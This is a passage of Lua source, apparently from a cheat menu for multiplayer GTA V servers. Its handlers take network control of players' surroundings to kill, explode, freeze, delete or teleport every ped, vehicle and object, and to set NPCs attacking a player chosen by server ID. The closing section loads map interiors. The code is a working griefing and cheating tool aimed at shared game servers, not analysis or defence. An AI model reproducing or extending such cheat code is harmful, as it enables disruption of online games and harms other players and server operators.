                        if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                            __REAPER1__.N.SetEntityCollision(__REAPER1__.V.HoverEnt, not p2, false)
                        end
                    end)
                end,
                ped = {
                    kill = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.SetEntityHealth(__REAPER1__.V.HoverEnt, 0)
                            end
                        end)
                    end,
                    weapon = function(p1, p2, p3, p4, p5, p6, p7)
                        local theWeaponHash = p2[p4] ~= 'Parachute' and __REAPER1__.N.GetHashKey('WEAPON_' .. p2[p4]) or __REAPER1__.N.GetHashKey('GADGET_' .. p2[p4])
                        if not __REAPER1__.N.HasPedGotWeapon(__REAPER1__.V.HoverEnt, theWeaponHash, false) then
                            __REAPER1__.N.GiveWeaponToPed(__REAPER1__.V.HoverEnt, theWeaponHash, 9999, false, true)
                        else
                            __REAPER1__.N.RemoveWeaponFromPed(__REAPER1__.V.HoverEnt, theWeaponHash)
                        end
                    end,
                    condition = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                if p4 == 1 then
                                    __REAPER1__.N.SetPedAngry(__REAPER1__.V.HoverEnt)
                                elseif p4 == 2 then
                                    __REAPER1__.N.SetPedHearingRange(__REAPER1__.V.HoverEnt, 0.0)
                                elseif p4 == 3 then
                                    __REAPER1__.N.SetPedSeeingRange(__REAPER1__.V.HoverEnt, 0.0)
                                elseif p4 == 4 then
                                    __REAPER1__.N.SetPedHearingRange(__REAPER1__.V.HoverEnt, 0.0)
                                    __REAPER1__.N.SetPedSeeingRange(__REAPER1__.V.HoverEnt, 0.0)
                                end
                            end
                        end)
                    end,
                    animation = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                local anim = __REAPER1__.T.SpawningPedAnims[p4]
                                if __REAPER1__.F.RequestAnimDict(anim.dict) then
                                    __REAPER1__.N.TaskPlayAnim(__REAPER1__.V.HoverEnt, anim.dict, anim.name, -1, -1, -1, 16, 0, false, false, false)
                                end
                            end
                        end)
                    end,
                    stopanim = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.ClearPedTasks(__REAPER1__.V.HoverEnt)
                            end
                        end)
                    end,
                    follow = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                local ped = __REAPER1__.F.ClosestEntity('player')
                                if p2 then
                                    __REAPER1__.N.TaskFollowToOffsetOfEntity(__REAPER1__.V.HoverEnt, ped, 0.0, 0.0, 0.0, 30.0, -1, 100.0, 1)
                                else
                                    __REAPER1__.N.TaskFollowToOffsetOfEntity(__REAPER1__.V.HoverEnt, ped, 0.0, 0.0, 0.0, 30.0, 1, 100.0, 1)
                                end
                            end
                        end)
                    end,
                    mindclear = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                               __REAPER1__.N.ClearPedTasksImmediately(__REAPER1__.V.HoverEnt)
                            end
                        end)
                    end,
                    attack = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                local ply = __REAPER1__.N.GetPlayerFromServerId(p2)

                                if __REAPER1__.N.NetworkIsPlayerActive(ply) then
                                    local ped = __REAPER1__.N.GetPlayerPed(ply)
                                    __REAPER1__.N.TaskCombatPed(__REAPER1__.V.HoverEnt, ped, 0, 16)
                                else
                                    __REAPER1__.F.AddNotification('Not a valid player server id.', 5000, 210, 210, 0)
                                end
                            end
                        end)
                    end,
                },
                veh = {
                    launchveh = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.ApplyForceToEntity(__REAPER1__.V.HoverEnt, 1, 0, 0, __REAPER1__.F.IntToFloat(p4 * 1000), 1.0, 0.0, 0.0, 1, false, true, false, false)
                            end
                        end)
                    end,
                    enginehealth = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.SetVehicleEngineHealth(__REAPER1__.V.HoverEnt, __REAPER1__.F.IntToFloat(p2[p4]))
                            end
                        end)
                    end,
                    bodyhealth = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.SetVehicleBodyHealth(__REAPER1__.V.HoverEnt, __REAPER1__.F.IntToFloat(p4 - 1))
                            end
                        end)
                    end,
                    fuckup = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.FuckUpVeh(__REAPER1__.V.HoverEnt)
                            end
                        end)
                    end,
                    randomize = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.RandomizeVehLook(__REAPER1__.V.HoverEnt)
                            end
                        end)
                    end,
                    tune = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.TuneVehicle(__REAPER1__.V.HoverEnt)
                            end
                        end)
                    end,
                    downgrade = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.DowngradeVeh(__REAPER1__.V.HoverEnt)
                            end
                        end)
                    end,
                    fix = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.FixVehicle(__REAPER1__.V.HoverEnt)
                            end
                        end)
                    end,
                    maxspeed = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.SetEntityMaxSpeed(__REAPER1__.V.HoverEnt, __REAPER1__.F.IntToFloat(p4 - 1) / 3.6)
                            end
                        end)
                    end,
                    speed = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.SetVehicleForwardSpeed(__REAPER1__.V.HoverEnt, __REAPER1__.F.IntToFloat(p4 - 1) / 3.6)
                            end
                        end)
                    end,
                    fuel = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                if __REAPER1__.N.DecorExistOn(__REAPER1__.V.HoverEnt, "_FUEL_LEVEL") then
                                    __REAPER1__.N.DecorSetFloat(__REAPER1__.V.HoverEnt, "_FUEL_LEVEL", __REAPER1__.F.IntToFloat(p4 - 1))
                                else
                                    __REAPER1__.N.SetVehicleFuelLevel(__REAPER1__.V.HoverEnt, __REAPER1__.F.IntToFloat(p4 - 1))
                                end
                            end
                        end)
                    end,
                    removewheels = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                __REAPER1__.N.RemoveWheel(__REAPER1__.V.HoverEnt)
                            end
                        end)
                    end,
                    lock = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                                local lock = __REAPER1__.N.GetVehicleDoorLockStatus(__REAPER1__.V.HoverEnt)
                                if lock == 0 or lock == 1 then
                                    __REAPER1__.N.OpDoorLock(__REAPER1__.V.HoverEnt, 2)
                                elseif lock == 2 then
                                    __REAPER1__.N.OpDoorLock(__REAPER1__.V.HoverEnt, 1)
                                end
                            end
                        end)
                    end,
                },
            },
            peds = {
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                        if not __REAPER1__.N.IsPedAPlayer(v) then
                            __REAPER1__.N.DeleteEntity(v)
                        end
                    end
                end,
                bring = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityCoordsNoOffset(v, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), true, true, true)
                            end
                        end
                    end)
                end,
                heading = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityHeading(v, p4 - 1)
                            end
                        end
                    end)
                end,
                coords = function(p1, p2, p3, p4, p5, p6, p7)
                    local x, y, z = __REAPER1__.F.AdvStringSplit(3, p2, ' ', true)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityCoordsNoOffset(v, x, y, z, true, true, true)
                            end
                        end
                    end)
                end,
                invisible = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityVisible(v, not p2)
                            end
                        end
                    end)
                end,
                godded = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityInvincible(v, p2)
                            end
                        end
                    end)
                end,
                freeze = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.FreezeEntityPosition(v, p2)
                            end
                        end
                    end)
                end,
                nocollision = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityCollision(v, not p2, false)
                            end
                        end
                    end)
                end,
                explode = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) then
                                __REAPER1__.N.CreateExplosion(__REAPER1__.N.GetEntityCoords(v), 7, 500.0, true, false, 1.0)

                                __REAPER26__(5)
                            end
                        end
                    end)
                end,
                push = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.ApplyForceToEntity(v, 3, __REAPER1__.N.GetEntityForwardVector(v) * 100, 0, 0, 0, false, false, true, true, false, true)
                            end
                        end
                    end)
                end,
                kill = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityHealth(v, 0)
                            end
                        end
                    end)
                end,
                weapon = function(p1, p2, p3, p4, p5, p6, p7)
                    local theWeaponHash = p2[p4] ~= 'Parachute' and __REAPER1__.N.GetHashKey('WEAPON_' .. p2[p4]) or __REAPER1__.N.GetHashKey('GADGET_' .. p2[p4])
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                if not __REAPER1__.N.HasPedGotWeapon(v, theWeaponHash, false) then
                                    __REAPER1__.N.GiveWeaponToPed(v, theWeaponHash, 9999, false, true)
                                else
                                    __REAPER1__.N.RemoveWeaponFromPed(v, theWeaponHash)
                                end
                            end
                        end
                    end)
                end,
                condition = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                if p4 == 1 then
                                    __REAPER1__.N.SetPedAngry(v)
                                elseif p4 == 2 then
                                    __REAPER1__.N.SetPedHearingRange(v, 0.0)
                                elseif p4 == 3 then
                                    __REAPER1__.N.SetPedSeeingRange(v, 0.0)
                                elseif p4 == 4 then
                                    __REAPER1__.N.SetPedHearingRange(v, 0.0)
                                    __REAPER1__.N.SetPedSeeingRange(v, 0.0)
                                end
                            end
                        end
                    end)
                end,
                animation = function(p1, p2, p3, p4, p5, p6, p7)
                    local anim = __REAPER1__.T.SpawningPedAnims[p4]
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestAnimDict(anim.dict) then
                            for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                                if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                    __REAPER1__.N.TaskPlayAnim(v, anim.dict, anim.name, -1, -1, -1, 16, 0, false, false, false)
                                end
                            end
                        end
                    end)
                end,
                stopanim = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.ClearPedTasks(v)
                            end
                        end
                    end)
                end,
                mindclear = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.ClearPedTasksImmediately(v)
                            end
                        end
                    end)
                end,
                attack = function(p1, p2, p3, p4, p5, p6, p7)
                    local ply = __REAPER1__.N.GetPlayerFromServerId(p2)
                
                    if __REAPER1__.N.NetworkIsPlayerActive(ply) then
                        local ped = __REAPER1__.N.GetPlayerPed(ply)
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                                if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                    __REAPER1__.N.TaskCombatPed(__REAPER1__.V.HoverEnt, ped, 0, 16)
                                end
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Not a valid player server id.', 5000, 210, 210, 0)
                    end
                end,
                clothing = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetPedRandomComponentVariation(v)
                            end
                        end
                    end)
                end,
                putinveh = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        local hash = __REAPER1__.N.GetHashKey(p2)
                        if __REAPER1__.F.RequestEntity(hash) then
                            for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                                if not __REAPER1__.N.IsPedAPlayer(v) and not __REAPER1__.N.IsPedInAnyVehicle(v) and __REAPER1__.F.NetControl(v) then
                                    __REAPER1__.N.PutInVehicle(v, hash)
                                end
                            end
                        end
                    end)
                end,
                turninto = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(p6[p4]) then
                            for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                                local c = __REAPER1__.N.GetEntityCoords(v)
                                local ent = __REAPER1__.N.CreateObject(p6[p4], c.x, c.y, c.z + 5.0, true, true, false)
                                __REAPER1__.N.AttachEntityToEntity(ent, v, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, 0, true)
                            end
                        end
                    end)
                end,
            },
            vehicles = {
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                        __REAPER1__.N.DeleteEntity(v)
                    end
                end,
                bring = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityCoordsNoOffset(v, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), true, true, true)
                            end
                        end
                    end)
                end,
                heading = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityHeading(v, p4 - 1)
                            end
                        end
                    end)
                end,
                coords = function(p1, p2, p3, p4, p5, p6, p7)
                    local x, y, z = __REAPER1__.F.AdvStringSplit(3, p2, ' ', true)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityCoordsNoOffset(v, x, y, z, true, true, true)
                            end
                        end
                    end)
                end,
                invisible = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityVisible(v, not p2)
                            end
                        end
                    end)
                end,
                godded = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityInvincible(v, p2)
                            end
                        end
                    end)
                end,
                freeze = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.FreezeEntityPosition(v, p2)
                            end
                        end
                    end)
                end,
                nocollision = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityCollision(v, not p2, false)
                            end
                        end
                    end)
                end,
                explode = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            __REAPER1__.N.CreateExplosion(__REAPER1__.N.GetEntityCoords(v), 7, 500.0, true, false, 1.0)

                            __REAPER26__(5)
                        end
                    end)
                end,
                push = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.ApplyForceToEntity(v, 3, __REAPER1__.N.GetEntityForwardVector(v) * 100, 0, 0, 0, false, false, true, true, false, true)
                            end
                        end
                    end)
                end,
                enginehealth = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetVehicleEngineHealth(v, __REAPER1__.F.IntToFloat(p2[p4]))
                            end
                        end
                    end)
                end,
                bodyhealth = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetVehicleBodyHealth(v, __REAPER1__.F.IntToFloat(p4 - 1))
                            end
                        end
                    end)
                end,
                fuckup = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.FuckUpVeh(v)
                            end
                        end
                    end)
                end,
                randomize = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.RandomizeVehLook(v)
                            end
                        end
                    end)
                end,
                tune = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.TuneVehicle(v)
                            end
                        end
                    end)
                end,
                fix = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.FixVehicle(v)
                            end
                        end
                    end)
                end,
                maxspeed = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityMaxSpeed(v, __REAPER1__.F.IntToFloat(p4 - 1) / 3.6)
                            end
                        end
                    end)
                end,
                speed = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetVehicleForwardSpeed(v, __REAPER1__.F.IntToFloat(p4 - 1) / 3.6)
                            end
                        end
                    end)
                end,
                removewheels = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.RemoveWheel(v)
                            end
                        end
                    end)
                end,
                lock = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                local lock = __REAPER1__.N.GetVehicleDoorLockStatus(v)
                                if lock == 0 or lock == 1 then
                                    __REAPER1__.N.OpDoorLock(v, 2)
                                elseif lock == 2 then
                                    __REAPER1__.N.OpDoorLock(v, 1)
                                end
                            end
                        end
                    end)
                end,
                fuel = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                            if __REAPER1__.F.NetControl(v) then
                                if __REAPER1__.N.DecorExistOn(v, "_FUEL_LEVEL") then
                                    __REAPER1__.N.DecorSetFloat(v, "_FUEL_LEVEL", __REAPER1__.F.IntToFloat(p4 - 1))
                                else
                                    __REAPER1__.N.SetVehicleFuelLevel(v, __REAPER1__.F.IntToFloat(p4 - 1))
                                end
                            end
                        end
                    end)
                end,
                turninto = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(p6[p4]) then
                            for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                                local c = __REAPER1__.N.GetEntityCoords(v)
                                local ent = __REAPER1__.N.CreateObject(p6[p4], c.x, c.y, c.z + 5.0, true, true, false)
                                __REAPER1__.N.AttachEntityToEntity(ent, v, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, 0, true)
                            end
                        end
                    end)
                end,
            },
            objects = {
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in pairs(__REAPER1__.N.GameTable('CObject')) do
                        __REAPER1__.N.DeleteEntity(v)
                    end
                end,
                bring = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CObject')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityCoordsNoOffset(v, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), true, true, true)
                            end
                        end
                    end)
                end,
                heading = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CObject')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityHeading(v, p4 - 1)
                            end
                        end
                    end)
                end,
                coords = function(p1, p2, p3, p4, p5, p6, p7)
                    local x, y, z = __REAPER1__.F.AdvStringSplit(3, p2, ' ', true)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CObject')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityCoordsNoOffset(v, x, y, z, true, true, true)
                            end
                        end
                    end)
                end,
                invisible = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CObject')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityVisible(v, not p2)
                            end
                        end
                    end)
                end,
                godded = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CObject')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityInvincible(v, p2)
                            end
                        end
                    end)
                end,
                freeze = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CObject')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.FreezeEntityPosition(v, p2)
                            end
                        end
                    end)
                end,
                nocollision = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CObject')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetEntityCollision(v, not p2, false)
                            end
                        end
                    end)
                end,
                explode = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CObject')) do
                            __REAPER1__.N.CreateExplosion(__REAPER1__.N.GetEntityCoords(v), 7, 500.0, true, false, 1.0)

                            __REAPER26__(5)
                        end
                    end)
                end,
                push = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CObject')) do
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.ApplyForceToEntity(v, 3, __REAPER1__.N.GetEntityForwardVector(v) * 100, 0, 0, 0, false, false, true, true, false, true)
                            end
                        end
                    end)
                end,
            },
            iplloader = {
                default = {
                    ammunation = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState({140289,153857,168193,164609,176385,175617,200961,180481,178689}, 'GunStoreHooks', not __REAPER1__.A['world:iplloader_unload'].func, true)
                        __REAPER1__.F.SetIplPropState({137729,248065}, 'GunClubWallHooks', not __REAPER1__.A['world:iplloader_unload'].func, true)
                    end,
                    bahama = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.EnableIpl('hei_sm_16_interior_v_bahama_milo_', not __REAPER1__.A['world:iplloader_unload'].func)
                    end,
                    base = function(p1, p2, p3, p4, p5, p6, p7)
                        local ipls = {"post_hiest_unload","refit_unload","FINBANK","Coroner_Int_on","coronertrash","CS1_02_cf_onmission1","CS1_02_cf_onmission2","CS1_02_cf_onmission3","CS1_02_cf_onmission4","farm","farmint","farm_lod","farm_props","des_farmhouse","FIBlobby","FruitBB","sc1_01_newbill","hw1_02_newbill","hw1_emissive_newbill","sc1_14_newbill","dt1_17_newbill","id2_14_during_door","id2_14_during1","facelobby","v_tunnel_hole","Carwash_with_spinners","sp1_10_real_interior","sp1_10_real_interior_lod","ch1_02_open","bkr_bi_id1_23_door","lr_cs6_08_grave_closed","methtrailer_grp1","bkr_bi_hw1_13_int","CanyonRvrShallow","bh1_47_joshhse_unburnt","bh1_47_joshhse_unburnt_lod","hei_sm_16_interior_v_bahama_milo_","cs3_05_water_grp1","cs3_05_water_grp1_lod","trv1_trail_start","canyonriver01","canyonriver01_lod","ferris_finale_anim"}
                        for k,v in pairs(ipls) do
                            if not __REAPER1__.A['world:iplloader_unload'].func and not __REAPER1__.N.IsIplActive(v) then
                                __REAPER1__.N.RequestIpl(v)
                            elseif __REAPER1__.A['world:iplloader_unload'].func and __REAPER1__.N.IsIplActive(v) then
                                __REAPER1__.N.RemoveIpl(v)
                            end
                        end
                    end,
                    floyd = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(171777, {{"swap_clean_apt", "layer_debra_pic", "layer_whiskey", "swap_sofa_A"}, {"layer_mess_A", "layer_mess_B", "layer_mess_C", "layer_sextoys_a", "swap_sofa_B", "swap_wade_sofa_A", "layer_wade_shit", "layer_torture"}}, __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(171777, {"swap_clean_apt", "layer_debra_pic", "layer_whiskey", "swap_sofa_A"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
